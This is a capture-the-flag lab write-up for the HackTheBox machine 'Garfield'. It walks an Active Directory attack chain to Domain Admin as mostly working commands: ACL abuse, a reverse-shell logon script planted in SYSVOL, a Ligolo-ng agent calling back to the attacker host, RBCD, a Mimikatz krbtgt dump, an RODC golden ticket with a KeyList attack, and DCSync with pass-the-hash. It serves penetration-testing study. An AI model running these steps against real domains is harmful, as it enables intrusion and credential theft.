# Garfield — HackTheBox

| Field | Detail |
|---|---|
| Target | DC01.garfield.htb — 10.129.16.120 |
| Domain | garfield.htb |
| OS | Windows Server 2019 |
| Difficulty | Hard |
| Date | April 10, 2026 |
| Initial Creds | j.arbuckle / Th1sD4mnC4t!@1978 |
| Result | Domain Admin |

## Summary

Hard AD machine. scriptPath injection via WriteDacl/WriteProperty ACL abuse → shell as `l.wilson` → password reset on `l.wilson_adm` → Ligolo-ng pivot to internal RODC01 → RBCD to get SYSTEM → Mimikatz dumps `krbtgt_8245` AES256 key → RODC Golden Ticket + KeyList attack → Administrator NT hash → DCSync.

## Attack Chain

| # | Technique | Result |
|---|---|---|
| 01 | Nmap | Port 2179 (Hyper-V) reveals internal RODC |
| 02 | BloodHound | `j.arbuckle` has WriteDacl + WriteProperty on `l.wilson` |
| 03 | scriptPath injection | Malicious logon script → shell as `l.wilson` |
| 04 | Password reset | `l.wilson_adm` reset → WinRM → user.txt |
| 05 | RODC Admin Group | `l.wilson_adm` added to RODC Administrators |
| 06 | Ligolo-ng | Tunnel to 192.168.100.0/24 |
| 07 | RBCD on RODC01 | FAKE$ + S4U2Proxy → cifs/RODC01 ticket |
| 08 | SYSTEM on RODC01 | psexec via RBCD ticket |
| 09 | Mimikatz | AES256 key of `krbtgt_8245` |
| 10 | PRP modification | Administrator added to RevealOnDemand |
| 11 | RODC Golden Ticket | Rubeus `/rodcNumber:8245` |
| 12 | KeyList attack | Administrator NT hash |
| 13 | DCSync + Root | secretsdump → evil-winrm → root.txt |

## Reconnaissance

```bash
echo '10.129.16.120 DC01.garfield.htb garfield.htb' | sudo tee -a /etc/hosts
echo '192.168.100.2 RODC01.garfield.htb RODC01' | sudo tee -a /etc/hosts
nmap -sC -sV -p- --min-rate 5000 10.129.16.120
```

Port 2179 (Hyper-V vmrdp) signals the presence of internal VMs — this is where RODC01 lives.

## BloodHound — ACL Abuse & scriptPath Injection

```bash
bloodhound-python -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  -d garfield.htb -ns 10.129.16.120 -c all

# Grant GenericAll on l.wilson
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb \
  --host 10.129.16.120 add genericAll l.wilson j.arbuckle

# Upload reverse shell to SYSVOL
smbclient //10.129.16.120/SYSVOL -U 'garfield.htb\j.arbuckle%Th1sD4mnC4t!@1978'
# put evil.bat \garfield.htb\scripts\evil.bat

# Point scriptPath to malicious script
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb \
  --host 10.129.16.120 set object l.wilson scriptPath \
  --value '\\garfield.htb\SYSVOL\garfield.htb\scripts\evil.bat'

nc -lvnp 4444
# Wait for l.wilson login → shell received
```

## Lateral Movement

```bash
net user l.wilson_adm 'WhoKnows123!' /domain
evil-winrm -i 10.129.16.120 -u l.wilson_adm -p 'WhoKnows123!'
type C:\Users\l.wilson\Desktop\user.txt
Add-ADGroupMember -Identity 'RODC Administrators' -Members l.wilson_adm
```

## Pivot — Ligolo-ng

```bash
# Kali
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8081
sudo ip route add 192.168.100.0/24 dev ligolo

# DC01 (evil-winrm)
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert

# Ligolo console
session
tunnel_start --tun ligolo
```

## RBCD — SYSTEM on RODC01

```bash
# Create fake computer
impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
  -computer-name 'FAKEMACHINE$' -computer-pass 'FakePass123!' -dc-ip 10.129.16.120

# Set RBCD
Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKEMACHINE$

# S4U2Proxy ticket
faketime '...' impacket-getST garfield.htb/'FAKEMACHINE$':'FakePass123!' \
  -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.16.120

# SYSTEM on RODC01
KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache \
  faketime '...' impacket-psexec -k -no-pass \
  garfield.htb/Administrator@RODC01.garfield.htb -dc-ip 10.129.16.120
```

## RODC Golden Ticket + KeyList Attack

### Modify Password Replication Policy

```powershell
Set-ADComputer RODC01 -Clear msDS-NeverRevealGroup
Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}
```

### Dump krbtgt_8245 AES256 key

```bash
# From SYSTEM shell on RODC01
mimikatz.exe "lsadump::dcsync /user:krbtgt_8245" exit
```

### Forge RODC Golden Ticket

```bash
C:\Windows\Temp\Rubeus.exe golden `
  /rodcNumber:8245 `
  /flags:forwardable,renewable,enc_pa_rep `
  /nowrap `
  /outfile:C:\Windows\Temp\ticket.kirbi `
  /aes256:<krbtgt_8245_aes256_key> `
  /user:Administrator /id:500 `
  /domain:garfield.htb `
  /sid:S-1-5-21-2502726253-3859040611-225969357
```

### KeyList Attack → Administrator NT hash

```bash
C:\Windows\Temp\Rubeus.exe asktgs `
  /enctype:aes256 /keyList `
  /service:krbtgt/garfield.htb `
  /dc:DC01.garfield.htb `
  /ticket:C:\Windows\Temp\ticket_*_Administrator_to_krbtgt@GARFIELD.HTB.kirbi `
  /nowrap
```

## DCSync and Root

```bash
# Convert kirbi to ccache
python3 -c "from impacket.krb5.ccache import CCache; \
  cc=CCache.loadKirbiFile('/tmp/admin_tgt.kirbi'); cc.saveFile('/tmp/admin_tgt.ccache')"

# DCSync
KRB5CCNAME=/tmp/admin_tgt.ccache faketime '...' impacket-secretsdump \
  -k -no-pass garfield.htb/Administrator@DC01.garfield.htb \
  -dc-ip 10.129.16.120 -just-dc-ntlm

# Pass-the-Hash
evil-winrm -i 10.129.16.120 -u Administrator -H <NT_hash>
type C:\Users\Administrator\Desktop\root.txt
```

## Key Concepts

**RODC and krbtgt_XXXX** — Each RODC has its own krbtgt account with an independent AES256 key. The `rodcNumber` in the ticket's kvno field identifies which key signed the TGT. DC01 routes KeyList requests accordingly.

**KeyList Attack** — KERB-KEY-LIST-REQ allows a legitimate RODC to request credentials of users in its replication allowlist. By forging a RODC Golden Ticket, the same mechanism is exploited offensively.

**RBCD** — Resource-Based Constrained Delegation only requires GenericWrite on the target computer object — no Domain Admin needed.

**Ligolo-ng vs Chisel** — Ligolo-ng creates a TUN interface routing all traffic transparently. No per-tool proxy configuration required.
